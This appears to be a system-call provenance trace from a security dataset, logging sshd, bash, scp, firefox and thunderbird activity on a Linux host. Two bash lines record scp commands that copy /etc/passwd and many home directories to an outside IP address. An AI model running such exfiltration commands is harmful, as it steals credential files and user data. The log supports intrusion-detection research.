1557332325.117:691711604,02E2E62A-075F-187F-116F-D1D1D176FB74:thunderbird,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332325.061:691711334,790E2FCE-A58F-93ED-DB62-0829148EE122:thunderbird,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332325.061:691711333,790E2FCE-A58F-93ED-DB62-0829148EE122:thunderbird,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332324.077:691697270,6919A634-708C-4DC2-5B55-1E040750EE1B:thunderbird,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332324.077:691697268,6919A634-708C-4DC2-5B55-1E040750EE1B:thunderbird,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332324.077:691697228,6919A634-708C-4DC2-5B55-1E040750EE1B:thunderbird,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332324.069:691696347,6919A634-708C-4DC2-5B55-1E040750EE1B:thunderbird,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332324.069:691696346,6919A634-708C-4DC2-5B55-1E040750EE1B:thunderbird,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332324.053:691695124,FA971473-9A4D-F7F0-9366-640720B6E98F:thunderbird,EXECUTE,6919A634-708C-4DC2-5B55-1E040750EE1B,thunderbird,ta1-trace-2
1557332324.049:691695053,2AEBB821-EDC0-14A8-8204-571A9E4C9214:xfce4-appfinder,EXECUTE,FA971473-9A4D-F7F0-9366-640720B6E98F,thunderbird,ta1-trace-2
1557332324.049:691695032,8C5FA33C-8376-C9DD-93B4-ADA29E386B49:null,FORK,2AEBB821-EDC0-14A8-8204-571A9E4C9214,xfce4-appfinder,ta1-trace-2
1557332311.973:691684481,EE620D89-F8AE-7620-60EB-8B7A7F64C4A1:bash,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.973:691684395,4C6081F0-18A1-13C5-DC3D-36C16DA62E01:sshd,EXECUTE,EE620D89-F8AE-7620-60EB-8B7A7F64C4A1,bash,ta1-trace-2
1557332311.969:691684282,5E071128-93B2-58CA-53B3-AD87A04D312F:sshd,FORK,4C6081F0-18A1-13C5-DC3D-36C16DA62E01,sshd,ta1-trace-2
1557332311.969:691684236,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.969:691684230,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.969:691684210,6BE2B265-D83B-CF20-8558-01F567C5EB71:sshd,CHANGE_PRINCIPAL,5E071128-93B2-58CA-53B3-AD87A04D312F,sshd,ta1-trace-2
1557332311.969:691684188,5FB210E7-7613-1F52-57A4-4AF8C7DB704D:sshd,CHANGE_PRINCIPAL,6BE2B265-D83B-CF20-8558-01F567C5EB71,sshd,ta1-trace-2
1557332311.969:691684185,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,FORK,5FB210E7-7613-1F52-57A4-4AF8C7DB704D,sshd,ta1-trace-2
1557332311.969:691684176,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.969:691684140,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.969:691684137,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.969:691684134,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.965:691684058,CCB2DAF2-6D61-B0F5-292A-75780A7F1CAF:update-motd-fsc,EXECUTE,8F79507F-F13A-D9FA-B6E9-CD0A0850F6D2,cat,ta1-trace-2
1557332311.965:691684056,8B94024D-3B37-D5CB-0AEB-FABFE6637E94:update-motd-fsc,FORK,CCB2DAF2-6D61-B0F5-292A-75780A7F1CAF,update-motd-fsc,ta1-trace-2
1557332311.965:691683841,E3C9CF99-39F2-4E18-54D6-05D3210E3FEE:98-fsck-at-rebo,EXECUTE,8B94024D-3B37-D5CB-0AEB-FABFE6637E94,update-motd-fsc,ta1-trace-2
1557332311.961:691683819,F69CCF99-CFCA-BA5E-CF4F-ACDE44330BC7:run-parts,EXECUTE,E3C9CF99-39F2-4E18-54D6-05D3210E3FEE,98-fsck-at-rebo,ta1-trace-2
1557332311.961:691683818,027A73B0-8BC2-5AFB-534B-BC56AD334F8D:run-parts,FORK,F69CCF99-CFCA-BA5E-CF4F-ACDE44330BC7,run-parts,ta1-trace-2
1557332311.961:691683769,CAAA9099-4DC5-88EF-DE0A-DF48BDC0B634:update-motd-hwe,EXECUTE,17ACE90D-E530-7D80-060E-D0A6A9EB6953,cat,ta1-trace-2
1557332311.961:691683767,F0C1565C-D85F-0DF0-6BD1-36852680F5D0:update-motd-hwe,FORK,CAAA9099-4DC5-88EF-DE0A-DF48BDC0B634,update-motd-hwe,ta1-trace-2
1557332311.941:691682424,055E4842-2B96-2B1F-166F-4D507EF04E37:95-hwe-eol,EXECUTE,F0C1565C-D85F-0DF0-6BD1-36852680F5D0,update-motd-hwe,ta1-trace-2
1557332311.941:691682403,0ED01E8F-0D34-A10B-66CB-CAC8E8E72801:run-parts,EXECUTE,055E4842-2B96-2B1F-166F-4D507EF04E37,95-hwe-eol,ta1-trace-2
1557332311.941:691682402,027A73B0-8BC2-5AFB-534B-BC56AD334F8D:run-parts,FORK,0ED01E8F-0D34-A10B-66CB-CAC8E8E72801,run-parts,ta1-trace-2
1557332311.917:691682066,7A059FA0-ACBB-E9DF-B568-45D85A1565CA:lsb_release,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.905:691681826,7DF25A08-D9A5-548F-1A4E-CD5BA44B7EE4:91-release-upgr,EXECUTE,7A059FA0-ACBB-E9DF-B568-45D85A1565CA,lsb_release,ta1-trace-2
1557332311.905:691681817,F7559555-6025-77B5-1B1F-861C3787D534:91-release-upgr,FORK,7DF25A08-D9A5-548F-1A4E-CD5BA44B7EE4,91-release-upgr,ta1-trace-2
1557332311.905:691681810,AD578340-3C97-8DD8-230C-699527803258:91-release-upgr,FORK,F7559555-6025-77B5-1B1F-861C3787D534,91-release-upgr,ta1-trace-2
1557332311.905:691681788,D2551595-7109-A02B-00D4-5951400116BC:run-parts,EXECUTE,AD578340-3C97-8DD8-230C-699527803258,91-release-upgr,ta1-trace-2
1557332311.905:691681787,027A73B0-8BC2-5AFB-534B-BC56AD334F8D:run-parts,FORK,D2551595-7109-A02B-00D4-5951400116BC,run-parts,ta1-trace-2
1557332311.905:691681761,DDF8F042-113C-B283-2843-87B5F87F0E55:update-motd-upd,EXECUTE,A91B0A04-5516-D2C6-4953-FAE642F025F2,cat,ta1-trace-2
1557332311.905:691681759,1CE96142-D0FA-1C40-06C8-E48000D5AF59:update-motd-upd,FORK,DDF8F042-113C-B283-2843-87B5F87F0E55,update-motd-upd,ta1-trace-2
1557332311.889:691680727,EF3D590C-17D9-BA16-0A16-8719AFC25D67:90-updates-avai,EXECUTE,1CE96142-D0FA-1C40-06C8-E48000D5AF59,update-motd-upd,ta1-trace-2
1557332311.889:691680706,40B5767D-222B-1807-59C4-664D266C68C5:run-parts,EXECUTE,EF3D590C-17D9-BA16-0A16-8719AFC25D67,90-updates-avai,ta1-trace-2
1557332311.889:691680705,027A73B0-8BC2-5AFB-534B-BC56AD334F8D:run-parts,FORK,40B5767D-222B-1807-59C4-664D266C68C5,run-parts,ta1-trace-2
1557332311.753:691673693,5CC008FC-5523-4E63-09FE-17630F469C6A:landscape-sysin,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.749:691673295,CFA986CB-6284-9948-DD90-FCE4794B2C18:50-landscape-sy,EXECUTE,5CC008FC-5523-4E63-09FE-17630F469C6A,landscape-sysin,ta1-trace-2
1557332311.749:691673290,8B6305C3-D22A-CC11-26BA-3BE603B9AB59:50-landscape-sy,FORK,CFA986CB-6284-9948-DD90-FCE4794B2C18,50-landscape-sy,ta1-trace-2
1557332311.741:691673035,72570A88-04AD-C0E2-81DD-C6E169605945:run-parts,EXECUTE,8B6305C3-D22A-CC11-26BA-3BE603B9AB59,50-landscape-sy,ta1-trace-2
1557332311.741:691673032,027A73B0-8BC2-5AFB-534B-BC56AD334F8D:run-parts,FORK,72570A88-04AD-C0E2-81DD-C6E169605945,run-parts,ta1-trace-2
1557332311.737:691672713,F8C64BC5-F749-24F8-C028-1525B60C4111:env,EXECUTE,027A73B0-8BC2-5AFB-534B-BC56AD334F8D,run-parts,ta1-trace-2
1557332311.737:691672687,CDAB8BF6-5488-E1E9-1446-B8ECDC63C8B9:sh,EXECUTE,F8C64BC5-F749-24F8-C028-1525B60C4111,env,ta1-trace-2
1557332311.737:691672667,391F8A20-B091-3CC2-2288-B080700F4776:sh,FORK,CDAB8BF6-5488-E1E9-1446-B8ECDC63C8B9,sh,ta1-trace-2
1557332311.733:691672622,90B1565D-51E4-A87A-10C4-B7DA3C84B861:sshd,EXECUTE,391F8A20-B091-3CC2-2288-B080700F4776,sh,ta1-trace-2
1557332311.733:691672605,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,FORK,90B1565D-51E4-A87A-10C4-B7DA3C84B861,sshd,ta1-trace-2
1557332311.733:691672591,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.709:691672197,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.709:691672146,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.709:691672134,F6A0C9AA-5D4F-AB88-8617-6E7BA9DE307D:sshd,CHANGE_PRINCIPAL,7CCB59B5-D10D-8E73-B768-12B2C0170173,sshd,ta1-trace-2
1557332311.709:691672133,C0005AB2-CF65-CE41-45E5-8778BBF970BC:sshd,CHANGE_PRINCIPAL,F6A0C9AA-5D4F-AB88-8617-6E7BA9DE307D,sshd,ta1-trace-2
1557332311.709:691672132,F6A0C9AA-5D4F-AB88-8617-6E7BA9DE307D:sshd,CHANGE_PRINCIPAL,C0005AB2-CF65-CE41-45E5-8778BBF970BC,sshd,ta1-trace-2
1557332311.709:691672131,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,CHANGE_PRINCIPAL,F6A0C9AA-5D4F-AB88-8617-6E7BA9DE307D,sshd,ta1-trace-2
1557332311.709:691672129,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.709:691672115,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.709:691672075,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557332311.709:691672072,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.697:691672047,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557332311.697:691672044,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.593:691671821,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.593:691671789,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332311.593:691671788,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332311.501:691671574,7CCB59B5-D10D-8E73-B768-12B2C0170173:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332311.493:691671318,B9F0760C-86F6-F0FB-4CF8-3A3000D86F56:sshd,EXECUTE,7CCB59B5-D10D-8E73-B768-12B2C0170173,sshd,ta1-trace-2
1557332311.493:691671297,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,B9F0760C-86F6-F0FB-4CF8-3A3000D86F56,sshd,ta1-trace-2
1557332293.565:691651654,03CCFE4D-B492-CFD7-F9F4-B21B2E5E288E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332293.565:691651651,03CCFE4D-B492-CFD7-F9F4-B21B2E5E288E:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332292.433:691649853,FBFEDE5A-5601-B4F0-D3CA-9580B6E245FE:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332292.433:691649852,FBFEDE5A-5601-B4F0-D3CA-9580B6E245FE:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332292.433:691649848,C67FBE1B-969E-CAA2-7056-F63F3430EAA4:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332292.433:691649845,C67FBE1B-969E-CAA2-7056-F63F3430EAA4:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332287.653:691645792,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332287.649:691645718,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332287.649:691645643,77406B6B-6917-A999-1ECD-94ACC61E38A1:sshd,CHANGE_PRINCIPAL,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E,sshd,ta1-trace-2
1557332287.649:691645642,77406B6B-6917-A999-1ECD-94ACC61E38A1:sshd,CHANGE_PRINCIPAL,77406B6B-6917-A999-1ECD-94ACC61E38A1,sshd,ta1-trace-2
1557332287.649:691645641,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,CHANGE_PRINCIPAL,77406B6B-6917-A999-1ECD-94ACC61E38A1,sshd,ta1-trace-2
1557332284.485:691637886,FBFEDE5A-5601-B4F0-D3CA-9580B6E245FE:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332284.485:691637885,FBFEDE5A-5601-B4F0-D3CA-9580B6E245FE:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332284.437:691637857,C67FBE1B-969E-CAA2-7056-F63F3430EAA4:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332284.437:691637856,C67FBE1B-969E-CAA2-7056-F63F3430EAA4:firefox,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332284.437:691637853,24DA4BA5-401E-BE39-7397-C601CFD1861A:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332284.437:691637851,24DA4BA5-401E-BE39-7397-C601CFD1861A:Socket Thread,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557332283.917:691637648,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.917:691637645,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.917:691637642,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.917:691637639,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.917:691637636,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.917:691637633,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.917:691637630,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.913:691637608,90028FD1-D555-13A8-4FD4-5E619F2EA685:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.913:691637513,92350877-47C5-D725-74CF-3187BAE660D5:scp,EXECUTE,90028FD1-D555-13A8-4FD4-5E619F2EA685,ssh,ta1-trace-2
1557332283.913:691637504,C86C86E4-69B0-7581-2D70-7C27E7418D52:scp,FORK,92350877-47C5-D725-74CF-3187BAE660D5,scp,ta1-trace-2
1557332283.913:691637497,C86C86E4-69B0-7581-2D70-7C27E7418D52:scp,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332283.909:691637436,DF20A025-8947-B802-EA5B-4643F605B313:bash,EXECUTE,C86C86E4-69B0-7581-2D70-7C27E7418D52,b'scp -r /home/admin/backup /home/admin/corporales /home/admin/Desktop /home/admin/docs /home/admin/Documents /home/admin/Downloads /home/admin/files /home/admin/glx_alsa_675.ko /home/admin/grains /home/admin/hosts /home/admin/hsperfdata_darpa /home/admin/ichthyodian /home/admin/insalivation /home/admin/jna-95354950 /home/admin/minion /home/admin/Music /home/admin/mytest /home/admin/nodeexporter /home/admin/out857 /home/admin/out864 /home/admin/passwd /home/admin/Pictures /home/admin/Public /home/admin/Templates /home/admin/test /home/admin/Videos /home/admin/work /home/admin/xvnc4viewer.deb admin@128.55.12.55:\\C:UsersadminDocuments',ta1-trace-2
1557332283.909:691637430,6A98CC66-1053-C000-0E66-078B3D32EE6D:bash,FORK,DF20A025-8947-B802-EA5B-4643F605B313,bash,ta1-trace-2
1557332281.793:691635288,6BB59445-0789-FB96-3410-B5B6CD2BC430:scp,READ,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.161:691634970,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.161:691634967,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.161:691634964,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.157:691634961,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.157:691634958,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.157:691634955,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.157:691634952,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.157:691634930,37C221B1-750D-4408-BF06-2408C85A5EB4:ssh,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.153:691634835,4AF305DA-C001-01C9-1C20-81E412EB99A2:scp,EXECUTE,37C221B1-750D-4408-BF06-2408C85A5EB4,ssh,ta1-trace-2
1557332281.153:691634826,6BB59445-0789-FB96-3410-B5B6CD2BC430:scp,FORK,4AF305DA-C001-01C9-1C20-81E412EB99A2,scp,ta1-trace-2
1557332281.153:691634819,6BB59445-0789-FB96-3410-B5B6CD2BC430:scp,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332281.153:691634758,E97EFF8A-88A8-500D-87EC-5BB5E70B3BEE:bash,EXECUTE,6BB59445-0789-FB96-3410-B5B6CD2BC430,b'scp -r /etc/passwd admin@128.55.12.55:.',ta1-trace-2
1557332281.153:691634752,6A98CC66-1053-C000-0E66-078B3D32EE6D:bash,FORK,E97EFF8A-88A8-500D-87EC-5BB5E70B3BEE,bash,ta1-trace-2
1557332280.977:691631933,6A98CC66-1053-C000-0E66-078B3D32EE6D:bash,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332280.977:691631850,7EA66B8A-15B2-0868-EC6C-9D8D0E110781:sshd,EXECUTE,6A98CC66-1053-C000-0E66-078B3D32EE6D,bash,ta1-trace-2
1557332280.977:691631737,3FD1A1BD-8D95-5050-12C2-826B46D0BFBF:sshd,FORK,7EA66B8A-15B2-0868-EC6C-9D8D0E110781,sshd,ta1-trace-2
1557332280.973:691631691,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332280.973:691631685,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332280.973:691631665,9590AE9D-3166-FA00-EDC2-2CB8B8F8954C:sshd,CHANGE_PRINCIPAL,3FD1A1BD-8D95-5050-12C2-826B46D0BFBF,sshd,ta1-trace-2
1557332280.973:691631643,D435952E-437B-4479-CAD0-495FE1DC9054:sshd,CHANGE_PRINCIPAL,9590AE9D-3166-FA00-EDC2-2CB8B8F8954C,sshd,ta1-trace-2
1557332280.973:691631640,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,FORK,D435952E-437B-4479-CAD0-495FE1DC9054,sshd,ta1-trace-2
1557332280.973:691631631,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332280.973:691631595,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332280.973:691631592,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332280.973:691631589,EDA6BBFD-0F9A-C805-3922-DF2FA0E8D52E:sshd,MMAP,4702D245-E333-01AB-D7E7-E1CBE1C66E96,/etc/passwd,ta1-trace-2
1557332280.973:691631513,3E50A42C-EA2D-8C31-E081-ED3C206F95D6:update-motd-fsc,EXECUTE,8B73ABEE-FC66-851A-6ED7-8D62AA094AAD,cat,ta1-trace-2
1557332280.973:691631511,A55BF431-869E-45B6-3C34-F7769F9D3F95:update-motd-fsc,FORK,3E50A42C-EA2D-8C31-E081-ED3C206F95D6,update-motd-fsc,ta1-trace-2
1557332280.969:691631296,46086E99-E76C-A189-F266-868DD58AEAD0:98-fsck-at-rebo,EXECUTE,A55BF431-869E-45B6-3C34-F7769F9D3F95,update-motd-fsc,ta1-trace-2
1557332280.969:691631274,57DC8282-D7AD-56CE-3781-2DD83FB9A0AE:run-parts,EXECUTE,46086E99-E76C-A189-F266-868DD58AEAD0,98-fsck-at-rebo,ta1-trace-2
